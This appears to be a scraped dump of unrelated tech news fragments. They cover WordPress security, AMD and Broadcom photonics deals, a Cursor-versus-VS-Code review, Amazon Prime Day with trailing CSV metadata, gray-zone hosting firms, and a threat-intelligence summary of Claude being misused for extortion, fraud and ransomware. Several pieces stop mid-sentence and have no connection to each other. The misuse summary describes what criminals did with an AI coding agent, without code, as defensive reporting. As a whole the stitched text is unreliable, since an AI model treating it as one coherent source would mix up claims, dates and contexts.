The level of WordPress security expertise available will naturally vary from one organization to the next. Many of the websites are often maintained by individuals with little to no formal IT training. Unfortunately, WordPress sites are being increasingly targeted by cybercriminals that have learned how to exploit insecure software plugins that are often not formally supported by any commercial vendor, noted Abela.Additionally, many of those plug-ins are now being created using artificial intelligence (AI) coding tools that create additional vulnerabilities that cybercriminals might exploit, he added.As a general rule, most organizations that are managing WordPress sites would be better off relying on a third-party to help secure them, noted Abela.It’s not clear to what degree cybercriminals are specifically targeting WordPress sites, but defacement has become a common tactic employed by various advocacy groups seeking to embarrass an organization. The challenge is that many of these advocacy groups have, over the years, enjoyed considerable success defacing websites—suggesting WordPress weaknesses are widely known. More troubling still, in the age of artificial intelligence (AI), that knowledge—along with AI automation tools for launching attacks—has become much more accessible, making it all but certain that attacks will increase in both volume and sophistication.The issue then becomes not so much whether an attack can be prevented so much as it is how quickly can an organization recover in a way that minimizes as much as possible the amount of damage inflicted.Recent Articles By Author

Despite improvements in WordPress security, many website managers still lack essential security controls, such as user account protections and activity logs. The study underscores a notable concern for website availability and data theft among respondents, particularly those managing e-commerce sites. With many site maintainers lacking formal IT training, vulnerabilities are exacerbated by insecure plugins and the rise of AI-driven coding tools.

[Arnov] has created a really clean wearable design with great build instructions, so anyone who wants to make their own should have an easy time. Prefer to put your own spin on it, or feel inspired by the wrist-mounted enclosure? He’s thoughtfully provided the CAD files as well.
Inside the PIP-WATCH is a neat piece of hardware, the Lilygo T-Display-S3 Long. It’s an ESP32-based board with a wide, touch-enabled, color 180 x 640 display attached. That makes it a perfect fit for a project like this, at least in theory. In practice, [Arnov] found the documentation extremely lacking which made the hardware difficult to use, but he provides code and instructions so there’s no need to go through the same hassles he did.
In addition to the Hackaday.io project page, there’s an Instructables walkthrough.

Over the past few weeks, developers have been gradually admitting that they’re switching back from the AI coding tool Cursor to the integrated development environment Visual Studio Code.



The reasons are consistent: reliability, progress of Copilot, and a dawning realisation that features mean little when the basics break. Cursor, once the standout of the AI developer tool scene, is now seeing loyal users migrate, not because it failed, but because Microsoft quietly caught up.



Even those who still like Cursor are leaving without drama.

The terms of the deal were not disclosed. AMD did, however, detail that the acquisition will support internal engineering initiatives focused on artificial intelligence hardware.
Large-scale AI clusters comprise multiple server racks. Those racks, in turn, include not only graphics cards but also networking gear, cooling equipment and a range of other components. Historically, companies had to assemble the individual components manually into server racks.
AMD rival Nvidia Corp. offers a line of systems called the DGX series that eases the task. DGX appliances combine graphics cards, network equipment and the other hardware needed to run AI models into an integrated package. That removes the need for customers to assemble everything on their own.
The chipmaker reportedly plans to take a similar approach as Nvidia. Last year, it spent $4.8 billion to acquire ZT Systems Inc., a company that specializes in designing rack-scale data center systems. The purchase of Enosemi will support AMD’s efforts in this area.
Turning the components of a server cluster into a single functioning system requires connecting them over a network. In AI-optimized server clusters, that network is often based on fiber-optic cables. Sacramento-based Enosemi has developed a series of chips for powering fiber-optic data center networks.
“As AI models grow larger and more complex, the need for faster, more efficient data movement is accelerating,” Brian Amick, AMD’s senior vice president of technology and engineering, wrote in a blog post today. “To meet these evolving demands, particularly at the rack scale, optical interconnects offer a compelling path forward.”
Enosemi will support AMD’s efforts to develop co-packaged optics, or CPO, technology. This is an emerging type of hardware that can boost efficiency of AI clusters’ fiber-optic network equipment.
Servers turn data into light before sending it over a fiber-optic network and then turn it back into electrical signals. This task is performed with the help of devices called pluggable transceivers. The more servers there are in an AI cluster, the more transceivers are required. This means that the latter devices can represent a major expense for companies building large-scale AI infrastructure. 
CPO technology removes the need for pluggable transceivers. It does so by integrating a transceiver into the chips that power an AI cluster’s switches. In addition to reducing hardware costs, this arrangement can boost network performance. When a transceiver is integrated directly into a switch, data takes less time to travel between the transceiver and the switch’s other components, which lowers latency.
“Enosemi has collaborated with us as an external development partner on photonics, and this acquisition extends that successful relationship,” Amick wrote. “Now as part of AMD, the team will help us immediately scale our ability to support and develop a variety of photonics and co-packaged optics solutions across next-gen AI systems.”

But cybercriminals and other malicious actors are actively attempting to find ways around them. Today, we’re releasing a report that details how.

Our Threat Intelligence report discusses several recent examples of Claude being misused, including a large-scale extortion operation using Claude Code, a fraudulent employment scheme from North Korea, and the sale of AI-generated ransomware by a cybercriminal with only basic coding skills. We also cover the steps we’ve taken to detect and counter these abuses.

We find that threat actors have adapted their operations to exploit AI’s most advanced capabilities. Specifically, our report shows:

Agentic AI has been weaponized. AI models are now being used to perform sophisticated cyberattacks, not just advise on how to carry them out.AI has lowered the barriers to sophisticated cybercrime. Criminals with few technical skills are using AI to conduct complex operations, such as developing ransomware, that would previously have required years of training.Cybercriminals and fraudsters have embedded AI throughout all stages of their operations. This includes profiling victims, analyzing stolen data, stealing credit card information, and creating false identities allowing fraud operations to expand their reach to more potential targets.

Below, we summarize three case studies from our full report.

‘Vibe hacking’: how cybercriminals used Claude Code to scale a data extortion operation

The threat: We recently disrupted a sophisticated cybercriminal that used Claude Code to commit large-scale theft and extortion of personal data. The actor targeted at least 17 distinct organizations, including in healthcare, the emergency services, and government and religious institutions. Rather than encrypt the stolen information with traditional ransomware, the actor threatened to expose the data publicly in order to attempt to extort victims into paying ransoms that sometimes exceeded $500,000.

The actor used AI to what we believe is an unprecedented degree. Claude Code was used to automate reconnaissance, harvesting victims’ credentials, and penetrating networks. Claude was allowed to make both tactical and strategic decisions, such as deciding which data to exfiltrate, and how to craft psychologically targeted extortion demands. Claude analyzed the exfiltrated financial data to determine appropriate ransom amounts, and generated visually alarming ransom notes that were displayed on victim machines.

Above: simulated ransom guidance created by our threat intelligence team for research and demonstration purposes.

Above: A simulated custom ransom note. This is an illustrative example, created by our threat intelligence team for research and demonstration purposes after our analysis of extracted files from the real operation.

Implications: This represents an evolution in AI-assisted cybercrime. Agentic AI tools are now being used to provide both technical advice and active operational support for attacks that would otherwise have required a team of operators. This makes defense and enforcement increasingly difficult, since these tools can adapt to defensive measures, like malware detection systems, in real time. We expect attacks like this to become more common as AI-assisted coding reduces the technical expertise required for cybercrime.

Our response: We banned the accounts in question as soon as we discovered this operation. We have also developed a tailored classifier (an automated screening tool), and introduced a new detection method to help us discover activity like this as quickly as possible in the future. To help prevent similar abuse elsewhere, we have also shared technical indicators about the attack with relevant authorities.

Remote worker fraud: how North Korean IT workers are scaling fraudulent employment with AI

The threat: We discovered that North Korean operatives had been using Claude to fraudulently secure and maintain remote employment positions at US Fortune 500 technology companies. This involved using our models to create elaborate false identities with convincing professional backgrounds, complete technical and coding assessments during the application process, and deliver actual technical work once hired.

These employment schemes were designed to generate profit for the North Korean regime, in defiance of international sanctions. This is a long-running operation that began before the adoption of LLMs, and has been reported by the FBI.

Implications: North Korean IT workers previously underwent years of specialized training prior to taking on remote technical work, which made the regime’s training capacity a major bottleneck. But AI has eliminated this constraint. Operators who cannot otherwise write basic code or communicate professionally in English are now able to pass technical interviews at reputable technology companies and then maintain their positions. This represents a fundamentally new phase for these employment scams.

Our response: when we discovered this activity we immediately banned the relevant accounts, and have since improved our tools for collecting, storing, and correlating the known indicators of this scam. We’ve also shared our findings with the relevant authorities, and we’ll continue to monitor for attempts to commit fraud using our services.

No-code malware: selling AI-generated ransomware-as-a-service

The threat: A cybercriminal used Claude to develop, market, and distribute several variants of ransomware, each with advanced evasion capabilities, encryption, and anti-recovery mechanisms. The ransomware packages were sold on internet forums to other cybercriminals for $400 to $1200 USD.

Implications: This actor appears to have been dependent on AI to develop functional malware. Without Claude’s assistance, they could not implement or troubleshoot core malware components, like encryption algorithms, anti-analysis techniques, or Windows internals manipulation.

Our response: We have banned the account associated with this operation, and alerted our partners. We’ve also implemented new methods for detecting malware upload, modification, and generation, to more effectively prevent the exploitation of our platform in the future.

Next steps

In each of the cases described above, the abuses we’ve uncovered have informed updates to our preventative safety measures. We have also shared details of our findings, including indicators of misuse, with third-party safety teams.

In the full report, we address a number of other malicious uses of our models, including an attempt to compromise Vietnamese telecommunications infrastructure, and the use of multiple AI agents to commit fraud. The growth of AI-enhanced fraud and cybercrime is particularly concerning to us, and we plan to prioritize further research in this area.

We’re committed to continually improving our methods for detecting and mitigating these harmful uses of our models. We hope this report helps those in industry, government, and the wider research community strengthen their own defenses against the abuse of AI systems.

In December 2024, I wrote an article sharing my experience using VSCode (GitHub Copilot) and Cursor (Claude 3.5 Sonnet) from the perspective of a Data Scientist.




Should you switch from VSCode to Cursor?




I concluded the article by stating:




After using Cursor for the past two weeks, I have decided to use it for all of my future projects.




Since writing this article, not only have there been significant developments to VSCode and Cursor, but a new wave of AI-powered IDEs (e.g. Windsurf) have emerged. Upon evaluating and testing these alternative IDEs, I have decided to revert to VSCode as my primary IDE of choice.



In this article, I will discuss why I am no longer using Cursor, why I have reverted to VSCode and GitHub Copilot, and my opinion on what IDE you should be using as a Data Scientist.



What I Liked Most About Cursor



Let me state this first: Cursor is a great product. I kept hearing developers discuss Cursor more and more, with many taking advantage of their 2-week free trial. I was hesitant at first, but after reading persistent praise for the software, I decided to form my own opinion firsthand.



I loved that Cursor’s interface was the same as VSCode. Upon installation, Cursor enabled you to download all your existing VSCode extensions, which definitely helped with adoption as it made you feel right at home.



In December 2024, two key Cursor features made it stand out from the crowd. The first was the ability to use a number of different LLMs, unlike GitHub Copilot, which had restrictions on what LLMs were available. Secondly, Cursor had a feature called “Composer” that allowed users to generate an entire project code base by simply describing it via a prompt.



As described in my article “Should you switch from VSCode to Cursor?”, these were the two features I was most excited about and based my initial review on.



Why I Switched Back to VSCode



VSCode has been my primary IDE for over 7 years, I was also a beta tester for GitHub Copilot, something I have been paying for since its release.



As previously explained, a key benefit of Cursor is its similarity to VSCode from an interface perspective. Although a minor reason, switching back to VSCode meant I did not need to refamiliarise myself with an alternative UI.



GitHub Copilot eliminated one of the two main reasons for my initial move to Cursor when it enabled the ability to implement SOTA newly-released LLMs. As of writing in April 2025, below is the existing list of LLMs available via GitHub Copilot:



GitHub Copilot’s Available LLMs (April, 2025). Image captured and owned by the author.



Claude 3.7 Sonnet was released on February 24th, 2025. On the same day, Microsoft announced that this model was now available via GitHub Copilot. GPT-4.5 was released on February 27th, 2025, and was also made available on the same day in GitHub Copilot Chat to Copilot Enterprise users. 



A huge improvement on their LLM offering when compared to back in December 2024.



As a Data Scientist, I often work in Jupyter Notebooks for exploration tasks. Although AI-assistance works better when programming using .py files, I find VSCode is better than Cursor when working with Jupyter Notebooks. 



VSCode “Generate” option when adding a new Jupyter Notebook cell. Image captured and owned by the author.



VSCode offers GitHub Copilot instructions when adding a new cell to your notebook, this is not available using Cursor. Although AI-assistance is available, it is more difficult as the user has to use Ctrl/⌘ + K to begin writing their prompt.



When working with Jupyter Notebooks using VSCode and GitHub Copilot, you also have the ability to chat with your AI-assistant, referencing the cells in your notebook you want the AI to focus on. This functionality makes it incredibly easy to implement AI-assistance in your coding workflow.



The final two factors, which were less important but definitely played a role in my overall decision, were cost and usage in my professional role. 



GitHub Copilot costs $10 per month compared to Cursor, which costs $20 per month. I asked myself, am I getting twice the value from using Cursor over VSCode? The answer to this question was no, therefore, this added more weight towards reverting to VSCode.



Finally, in my professional role as a Lead Data Scientist, I use VSCode daily. I would never select an IDE based solely on the one I use in my professional role, although it definitely helps to keep things aligned where possible.



For the purpose of this article, I am highlighting high-level points from my experience with VSCode and GitHub Copilot. Feel free to message me via social media if you have more specific questions you would like to ask.



How GitHub Copilot Closed the Gap



GitHub was purchased for $7.5 billion by Microsoft in 2018. As Microsoft is a far larger company than Anysphere Inc., they’re able to place a lot more resources on improving their product offering. 



As an end user, competition is encouraged as it pushes companies to innovate and develop at a pace that enables them to keep up with each other. This also means that when a new feature is released and is widely adopted by the community, all of the competitor companies rush to develop that same feature into their own product offering.



When Cursor was first gaining popularity, it had many features (e.g., Composer, Tab, and Cursor Prediction) that its competitors did not have. This is no longer the case.



As shown in GitHub Copilot’s changelog, releases are occurring weekly, with some days consisting of more than one new feature being made available to all GitHub Copilot users.



As of today, there aren’t many features that Cursor offers that are not also available using VSCode and GitHub Copilot. Microsoft has shown in the past 4 months that it is placing huge importance on making GitHub Copilot the best AI coding assistant on the market. While some improvements are still needed, they are moving at a rapid pace, closing the gap, and are in a position to lead the market by the end of 2025.



Final Thoughts



Firstly, I don’t believe any text editor/IDE is better than any other. You should always make this judgment yourself based on trial-and-error and not finalise your decision based on what is most spoken about online.



I have been using VSCode for several weeks now since reverting from Cursor, and I have not regretted my decision. I believe Microsoft is making great progress with GitHub Copilot and has really closed the gap to all the new AI-assistant IDEs. 



There will always be features that pop up here and there that are not available in the IDE you’re currently using. If they’re widely adopted by the community, all competitors will implement them with time. Do not use this as an opportunity to keep switching your IDE.

It has recruited an unknown number of employees from an Intel Corp.-backed company called Untether AI Inc., which sells energy-efficient artificial intelligence inference chips for data centers and edge deployments.
News of the acquisition was first reported by CRN.com, which found out about the deal after spotting a post on LinkedIn by Justin Kinsey, president of the semiconductor recruitment firm SBT Industries Inc.
A spokesperson for AMD confirmed to CRN it has struck a deal to “acquire a talented team of AI hardware and software engineers” from the company. The new employees will help the chipmaker to advance its AI compiler and kernel development capabilities and enhance its system-on-chip design, verification and product integration processes, the company explained.
The acquisition appears to have been done and dusted last month, and it doesn’t include Untether Chief Executive Chris Walker, who formerly served at Intel until taking over the reins of the startup in early 2024. According to his LinkedIn profile, Walker stepped down from Untether AI last month.
The deal is somewhat unusual because AMD didn’t buy any of the company’s assets, but it nevertheless means Untether AI is shutting down its business for good. One of the company’s executives, Bob Beachler, told CRN that the deal “marks the end of Untether AI’s journey” and that it will no longer sell or support its existing “speedAI” processors or its “imAIgine” software development kit.
Toronto-based Untether AI was founded in 2018 and designed AI inference chips that featured an in-memory architecture to boost performance and reduce power consumption, making them suitable for low-energy edge applications such as sensors and drones. Its chips combined the memory and computing elements into the same package, rather than keeping them separate like traditional semiconductors do.
The approach has the benefit of eliminating the need to keep shunting data back and forth between different components within the chip, significantly reducing its energy requirements. It also makes computations faster, because data can go from the memory to the compute elements and back again in less time.
The startup got a lot of attention from bigger players in the chip industry, notably closing on a $125 million funding round led by Intel’s venture arm Intel Capital in July 2021. Since then it has quietly continued to make progress, launching its latest processor, the speedAI240 Slim AI inference accelerator card in October. At the time, the company said the new chip showed three times greater energy efficiency compared with rival chip hardware in the closed data center category.
Besides its relationship with Intel, Untether AI also had partnerships with the likes of Ampere Computing LLC, Arm Holdings Ltd. and NeuReality Inc.
Walker was interviewed by CRN as recently as April, and said that the company was seeing a lot of demand for its inference chips from clients looking for more efficient alternatives to Nvidia Corp.’s energy-hungry graphics processing units.
Because AMD didn’t buy Untether AI outright, the deal is really an “acquihire” rather than an acquisition, but it’s one that could be very important for the chipmaker, said Holger Mueller of Constellation Research Inc.
“Untether AI has developed some very promising technology with the combination of memory and compute in one module, upending the traditional way of making computer chips,” the analyst said. “If Untether AI’s team manages to do with AMD what it failed to do under its own steam — make a name for itself and establish real traction — then its technology could become a vital IP asset in future.”
The acquisition comes just two days after AMD announced it had bought a startup called Brium, which appears to have been operating in “stealth mode,” if its bare-bones website is any indication.
According to AMD’s press release, Brium specializes in the development of machine learning applications that enable AI inference. It seems to be interested in using Brium’s expertise to retrofit AI software so it can work with alternative hardware. This will help AMD to address the fact that the vast majority of AI developers optimize their software to run on Nvidia’s GPUs.
The acquisition of Brium came six days after AMD revealed plans to buy a startup called Enosemi Inc., which is a developer of silicon photonics chips that enable large clusters of AI accelerators to talk to each via fiber optic cables. That company will help AMD to boost its capabilities in network interconnects, as more customers look to combine thousands of processors together to power advanced AI workloads.
“AMD is on a real acquisition spree, and it’s looking to bolster its product portfolio,” Mueller added. “All three could prove very important later.”

As artificial intelligence pushes data center processing and networking capacities to their limits, optical interconnects are stepping up to keep pace to enable AI scale-up and scale-out networks.Broadcom Inc. recently announced its third-generation 200G/lane co-packaged optics (CPO) product line, which builds on CPO technology it has been focused on since 2021 with its first-generation Tomahawk 4-Humboldt chipset. In an interview with EE Times, Manish Mehta, VP of marketing and operations for Broadcom’s optical systems division, said the goal has been to deliver the lowest-power optical interconnects possible.Broadcom’s optical systems division has been built in part through acquisition, including the fiber optic product division of Avago, which was building optical transceivers based on multimode lasers. Mehta said Broadcom has spent the last five years investing in its CPO platform, which has leveraged several decades of laser technology development.

Prior to the AI boom, multimode optical transceivers were used predominantly in enterprise data centers to support the growth of cloud computing, he said. “The business has really shifted its focus to building optical components and laser technology that’s used in AI networks.”

		Broadcom recently announced its third-generation 200G/lane CPO product line. (Source: Broadcom)Mehta said optical bandwidth requirements have changed dramatically due to AI. At the front end, there are distributed workloads as each CPU parses queries, while at the back end, thousands of GPUs are handling training jobs. Optical interconnects have always been necessary for high-performance computing, but not at significant volumes, he said. “As soon as AI and recommendation engines and LLMs started to adopt this for their training networks, it really exploded.”


The high-reach requirements of large AI clusters and networks are driving the need for better optical solutions. With its CPO platform, Mehta said Broadcom is taking the optical content that has traditionally gone into transceivers and integrating it into much higher-density siliconized devices. “Then we’re moving it much, much closer to the core ASIC.”This integration reduces cost, Mehta said, and removes circuitry and digital-signal processing, which consumes a lot of power. “By co-packing the optical interconnect directly on a common substrate, you can eliminate a lot of that functionality and therefore reduce the power.”While Broadcom is eschewing the pluggable approach, the pluggable optics for data center market is experiencing significant growth, according to research firm LightCounting, and is projected to grow at a compound annual growth rate of 23% during 2025–2030 to exceed $24 billion, while the market share of transceivers based on silicon photonics (SiPho) modulators will increase from 30% in 2024 to 60% by 2030.Earlier this year, STMicroelectronics unveiled its next generation of proprietary technologies for higher-performing optical interconnects in data centers and AI clusters with an optical chip for transceivers that contains the company’s proprietary SiPho technology. In a briefing, Vincent Fraisse, the company’s group VP of RF and optical communication, said SiPho enables customers to integrate multiple complex components into one single chip.STMicroelectronics is combining SiPho with its BiCMOS technology, bringing ultra-high speeds and lower-power connectivity, which Fraisse said are key to sustain AI growth. “The challenge of hyperscaler companies is to optimize energy consumed per unit of compute.” He said the company believes in a new era of accelerated AI infrastructure where all elements are optically connected or interconnected.STMicroelectronics unveiled its next generation of proprietary technologies for higher-performing optical interconnects in data centers and AI clusters with a chip for transceivers that contains the company’s proprietary SiPho technology. (Source: STMicroelectronics)Like Broadcom, STMicroelectronics is looking to address the reach requirements of AI environments, and Fraisse said SiPho provides more performance, allowing longer range and at a higher speed, at 200G per lane, while also reducing power.Fraisse expects SiPho will get the lion’s share of transceivers in the coming years. “There is a clear trend in the industry to replace the back end of the rack copper cables by optical connections and densify them so much that they fit the physical dimensions of GPUs,” he said.

The facility, known as P2 (second plant), will utilise a three-nanometre (3 nm) process and is expected to begin production in 2027.



The move addresses growing customer demand for US-based manufacturing and aims to respond to trade measures such as US tariffs, The Commercial Times reported. Equipment installation is expected to begin as early as September 2026, with full production targeted for the following year.



Construction on P2 officially commenced in April 2025. The two-year build time reflects a compressed schedule, with the project running at full speed to meet customer needs. Equipment

Data center interconnect design and manufacturing startup OpenLight Photonics Inc. says it wants to accelerate the transition to silicon photonics after spinning out of its parent company Synopsys Inc. and closing on $34 million in Series A funding.
Today’s round was co-led by Xora Innovation and Capricorn Investment Group and saw participation from Juniper Networks, which is now a part of Hewlett Packard Enterprise Co., Mayfield, Lam Capital, New Legacy Ventures and K2 Access.
OpenLight has ambitions to become a key player in the design and manufacture of silicon photonics, which are a new kind of data center interconnect that’s used to link clusters of thousands of graphics processing units and other kinds of chips to power artificial intelligence and high-performance computing workloads.
Silicon photonics can solve a pressing bottleneck, where the processing capabilities of AI are no longer held back by computational limitations, but instead connectivity. The most advanced AI models today are powered by enormous clusters of GPUs, and this requires an ability for them to communicate with one another quickly. But they cannot keep up, and so this is where the new bottleneck exists. According to a study last year by Xscape Photonics, most AI developers can use only about 25% of a GPUs’ capacity because of the networking limitations they face.
The problem is that most existing data centers rely on electronic interconnects, but these lack the throughput to keep up with the most powerful processors in use today. As a result, GPUs often sit idle, waiting on a message from other processors before they can move onto the next computation, slowing down AI responses. Silicon photonics ditch the electronic signals and instead rely on the manipulation of light to transmit data from chip to chip at much greater speeds.
Accelerating silicon photonics
OpenLight designs and builds what it calls photonic application-specific integrated circuits or PASICs that power these new optical interconnects. PASICs can be thought of as the photonic equivalent of application-specific integrated circuits or ASICs, which are central to the operation of most electrical devices and computers today, optimizing performance, cost and efficiency. OpenLight believes its PASICs will become a core enabler of next-generation data center interconnects, but they can also be used in other applications, such as telecommunications, automotive and industrial sensing and quantum computing.
Chief Executive Adam Carter told SiliconANGLE that PASICs can help to make existing photonics-based interconnects much faster than is currently possible.
“Traditional silicon photonics hits performance ceilings at around 200 Gbps per waveguide, but OpenLight’s heterogeneous integration, particularly with indium phosphide, allows for high-performance 200G and 400 G modulators to be built directly into the chip,” he explained. “This enables dense, scalable optical interconnects with lower power consumption and higher bandwidth, which is key for AI workloads.”
The startup is focused on designing and building PASICs, and offers three distinct services, Carter said, including design, where it works with customers to create customized PASICs based on their specific use case requirements. It also supports design enablement with its Process Design Kit or PDK, enabling customers to design their own PASICs. OpenLight’s PDK is based on the heterogeneous integration of indium phosphide and silicon photonics, and provides access to an extensive library of active and passive components that span integrated lasers, amplifiers, modulators and detectors.
Once the designs are ready, OpenLight can then manufacture the physical PASICs for customers in partnership with Tower Semiconductor Inc., which has already validated its PDK to ensure each design is production ready. In other words, the startup allows customers to quickly design and build PASICs using proven building blocks, accelerating time-to-market.
Carter explained that being able to customize its PASICs is a key differentiator and a strong advantage, because each customer and application has very particular requirements when it comes to the individual components, such as the laser, modulator and semiconductor amplifiers used.
“OpenLight doesn’t build one-size-fits-all chips. Instead, we provide a robust, production-ready PDK and a library of silicon and indium phosphide components that allow customers to design their own PASICs, tailored to their specific applications,” Carter said. “Our customers aren’t buying just chips; they’re establishing a toolkit and the flexibility to build their own. This agility is especially important in a rapidly evolving market where standards are still forming, such as CPO, and allows customers to innovate and differentiate more quickly than with off-the-shelf solutions.”
Carter said OpenLight’s customers span include semiconductor companies, network equipment manufacturers, systems integrators and hyperscale data center operators. “We also support customers in adjacent markets like lidar, high-speed computing, industrial sensing and quantum computing,” he said. “Our first customers will start production at the end of 2025, generating the first royalty revenue for OpenLight in 2026. It is expected that announcements will be made as that happens.”
Long-term ambitions
The early-stage funding round comes just weeks after OpenLight completed its transition from a subsidiary of the chip design firm Synopsys to a standalone company, and it says it’s now ready to address the growing demand for faster and more efficient data movement in AI data centers. Carter said it’s not just the funding that’s useful for OpenLight, but also its investor’s expertise. He pointed out they have deep roots in the semiconductor industry, and that these contacts will help it to create a viable ecosystem around its technology.
“This funding will allow us to scale our operations, deepen our R&D efforts, and bring our groundbreaking products to market faster,” he said. “We believe heterogenous integrated silicon photonics will transform the way data is processed and transmitted, and we’re excited to be at the forefront of this revolution.”
Among other things, OpenLight intends to expand the number of active and passive components in its PDK library, with plans to offer customers a faster 400 gigabyte-per-second modulator and more advanced on-chip laser technology. Carter said the goal is to provide customers with the most flexible component design library in the industry. At the same time, he has plans to scale the company’s team to support early adopters as they move to high volume production of PASICs.
Capricorn Managing Partner Dipender Saluja expressed confidence that the rapid adoption of optical interconnects is inevitable due to the increasing data demands of AI Models and the persistent desire to reduce infrastructure costs.
“OpenLight’s heterogeneous architecture delivers on all three axes – performance, reliability and cost – which have hitherto held back the ubiquitous adoption of optical interconnects,” he said. “The strong foundry relationships and PDKs that OpenLight has developed create an ideal opportunity to meet the scale of demand that is needed for next generation AI hardware.”

Prime Day 2025 will be four days long, running from July 8 through July 11. A departure from previous years in which Prime Day was a 48-hour affair, this year the shopping event will span nearly an entire week, bringing thousands of exclusive, Prime-only deals on everything from electronics to fashion.

In addition to spurring a large number of sales in a short period of time, Amazon Prime Day has always been a way for the online retail giant to increase the overall number of Prime subscribers. Prime Day isn’t necessarily a perk of the $139-per-year service like access to Prime Video content or free two-day shipping are, but it certainly helps that most deals you’ll find on Amazon during the event are exclusively available to Prime members.

With the event being four days long this year, we expect to see some one-day-only deals as well as sales that span the entirety of Prime Day(s) proper. We usually recommend buying things on your list as soon as you see them go on sale just to avoid the disappointment that comes with items selling out, and this time is no different. That's especially true for deals that as listed as ""limited time,"" or any Lightning Deals that only last a few hours.

Prime Day in July has been the main shopping event for Amazon for a decade now, but that hasn’t stopped the company from expanding the event’s reach. “October Prime Day” has become a mainstay in the fall, and Amazon’s Big Spring Sale is a relatively new shopping event that has taken place in March over the past couple of years. No word yet on if October Prime Day 2025 will be a thing, but we believe it’s almost guaranteed at this point.

If you do plan on putting that Prime membership to use next month, you can turn to Engadget to find the tech deals worth your month during the two-day event. Unsurprisingly, Amazon Prime Day is one of the best times of the year to get Amazon devices, since most of them will likely be down to all-time-low prices. But we also expect to see worthwhile sales on headphones, robot vacuums, laptops, SSDs and much more. You can also follow Engadget Deals on X for the latest news during Prime Day.",https://www.engadget.com/big-tech/amazon-prime-day-2025-dates-officially-announced-the-shopping-event-returns-from-july-8-to-11-050449132.html,Valentina Palladino,2025-06-17 05:04:49,"Amazon has announced that Prime Day 2025 will be a four-day event from July 8 to July 11, extending beyond the previous 48-hour timeframe. This annual shopping event aims to boost sales and increase Prime membership subscriptions by offering exclusive deals to Prime members. While the focus remains on electronics and various products, the article emphasizes the urgency of purchasing items quickly to avoid sellouts, especially those marked as limited-time Lightning Deals. Amazon continues to evolve its shopping events, with hints at an upcoming October Prime Day, while highlighting its reputation as a prime opportunity for discounts on devices and tech.",f,,,2025-09-08 15:39:39.732854,,,[]

""We told them, 'If you want to move your websites and your data to a place where it's safe and can't be accessed by US law enforcement, feel free to reach out.'""And many did. Nearly every week, Weber's hosting company, FlokiNET, receives new requests from individuals and organizations looking to relocate sensitive information to jurisdictions with stronger privacy protection. Over the past two decades, Weber has built a reputation for hosting sensitive and politically charged data. FlokiNET's servers — located in Iceland, Finland, the Netherlands, and Romania — have supported a range of high-risk platforms and leaks, including DDoSecrets and WikiLeaks.They're not the only ones noticing a rise in requests from US-based clients seeking digital refuge. Other players in the gray-zone hosting space, including 1984 Hosting, headquartered in Reykjavík, Iceland, have reported the same trend. For many clients turning to these hosting companies, relocating data abroad has become the only secure option for continuing their work.Related:Cloud Repatriation Driven by AI, Cost, and Security""As a publisher and a queer person, I'm scared,"" says Emma Best, co-founder of whistleblower site DDoSecrets, a FlokiNET user. ""We're experiencing a repeat of 1934 Germany and the tearing down of the legal processes that protect us.""For Best and other at-risk people and organizations, digital security now hinges on finding hosting providers willing to shield them from takedown demands. As more governments seek to tighten control over online information, storing data overseas has become an act of resistance.Safe HavenGray-zone hosting providers operate on the edge of what's legally allowed. These companies offer anonymous sign-up and anonymous payment and have strict privacy-by-default policies. On the technical front, they rely heavily on open source tools and a network of trusted collaborators who volunteer their time and expertise.Legally, these providers maneuver through a patchwork of international jurisdictions, moving files between locations and following what Weber describes as ""optimized legal frameworks."" This means that locations are chosen based on what the customer wants to store. Iceland or Finland are good for journalistic content, while a legal adult website may choose the Netherlands.  Related:Accounting Firms Can't Skimp on Cybersecurity""We hack a bit, the law,"" Weber says.Once the data is stored on the company's servers, these providers will take extreme measures to protect it. ""We will not yield to frivolous requests from lawyers, law enforcement, or other government entities,"" says Mordur Aslaugarson, CEO of 1984 Hosting, an Iceland-based firm. ""We strive to be a trustworthy partner for clients operating under difficult circumstances and will defend their right to privacy and freedom of expression, all the way to the highest court in the land.""Weber has faced similar pressure. Over the years, his company has received multiple takedown notices — one of which arrived in 2020, when its servers hosted data related to Hong Kong independence protests. He refused to comply, so he received a fine that increases every day.""There's an arrest warrant in China for me,"" he says. ""I think the fine is a few million Hong Kong dollars now."" (In the US, 1 million HKD is equivalent to $128,198.70.)Weber no longer lives in his native Germany because certain laws could hold him personally accountable for the content his company hosts and the actions it takes — even if the company is registered elsewhere. The European Union is now preparing similar legislation, he says, tightening this space even further. Today he lives in an undisclosed location.Related:Microsoft Boosts Email Sender Rules for OutlookBoth he and Aslaugarson are mindful of the risks that come with their job. They avoid disclosing where they are or where they plan to travel and always assume someone's trying to hack their devices or their infrastructure.Their line of work brings them into contact with a wide spectrum of actors, from law enforcement agencies to shady individuals attempting to exploit their platforms. While it's often assumed that such platforms naturally attract cybercriminals, Weber says the reality is more nuanced. These situations are not that frequent, he adds, and systems can be put in place to filter out many abuse cases.FlokiNET charges customers in advance, and when they try to register a suspect domain, it tells them they are violating the terms and conditions; it will keep the money and give it to a customer in need. ""We call it a donation,"" he says.As for problematic content that gets stored on their servers, the company will take it down in a matter of hours, Weber says. Aslaugarson's 1984 Hosting follows similar principles, noting it is a Spamhaus White Hat network, with a zero-tolerance policy for malware and spam. It prioritizes protecting customers but will fully cooperate with law enforcement if it finds evidence of child pornography, incitement of violence and terrorism, he says.Replicating the ModelGiven the ongoing global instability — from the rise of extremist political movements to increasing government surveillance — there's a need for more infrastructure providers like FlokiNET and 1984 Hosting, Weber says. In his view, privacy-focused, resilient hosting services are vital to defending press freedom, civil liberties, and democratic values in an uncertain world.During the last Chaos Communication Congress in Germany, he and a colleague showed what they do and invited others to join them. ""We have to have as many options as possible,” he said.Many of the companies navigating the legal gray zones of internet hosting operate from Iceland or have servers there. The country has become a stronghold for free expression, offering robust legal protections to journalists, whistleblowers, human rights defenders, and others who rely on freedom of speech. Moreover, the country is not a member of the European Union or the Five Eyes or Nine Eyes surveillance alliances. Is cool climate makes it an ideal location for energy-efficient data centers.Iceland has established some of the world's strongest free speech and data privacy protections, centered on the Icelandic Modern Media Initiative (IMMI) — adopted by parliament in 2010 — which amended Icelandic laws to support freedom of information, speech, and expression.More than a dozen laws have been amended since to strengthen privacy, transparency, and media freedoms. These laws protect intermediaries, like hosting providers, from liability for user-generated content.Iceland's protective laws are not just theoretical. Throughout the years, their strength has been proved in court, in cases won by 1984 Hosting and other providers that have successfully resisted censorship attempts and protected their users' data.""I guess as long as the US government doesn't decide to invade Iceland, I would consider it to be one of the safest places because we have a very good legal shield,"" says Icelandic politician and activist Birgitta Jónsdóttir.Less than a year into the new US administration, more users are 